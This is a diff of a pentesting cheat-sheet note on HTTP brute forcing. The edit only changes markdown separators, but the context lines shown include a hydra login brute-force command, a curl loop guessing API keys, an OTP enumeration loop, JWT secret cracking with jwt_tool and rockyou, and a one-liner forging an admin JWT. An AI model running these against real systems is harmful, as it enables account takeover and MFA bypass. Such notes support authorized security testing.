@@ -19,7 +19,7 @@ linked:
 ---
 # HTTP Brute Forcing - Targets de Ataque
 
-***
+---
 
 ## Login Forms (Form-Based)
 
@@ -55,7 +55,7 @@ hydra -L users.txt -P passwords.txt \
   "/login:user=^USER^&pass=^PASS^:S=Welcome"
 ```
 
-___
+---
 
 ## Basic / Digest / NTLM Authentication
 
@@ -71,7 +71,7 @@ ___
 | `for k in $(cat keys.txt); do curl -s -o /dev/null -w '%{http_code}' -H "X-API-Key: $k" https://target/api/x \| grep -q 200 && echo "FOUND: $k"; done` | Custom API key header brute | App-specific. |
 ^bf-target-basic
 
-___
+---
 
 ## API Keys / Tokens / Secrets
 
@@ -101,7 +101,7 @@ for code in {000000..999999}; do
 done
 ```
 
-___
+---
 
 ## OTP / MFA Codes
 
@@ -130,7 +130,7 @@ wait
 # O Burp Turbo Intruder con concurrentConnections=1, engine=Engine.BURP2
 ```
 
-___
+---
 
 ## Session Cookie / JWT Secret
 
@@ -162,4 +162,4 @@ python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt
 python3 -c "import jwt; print(jwt.encode({'role':'admin','exp':9999999999}, 'CRACKED_SECRET', 'HS256'))"
 ```
 
-***
+---
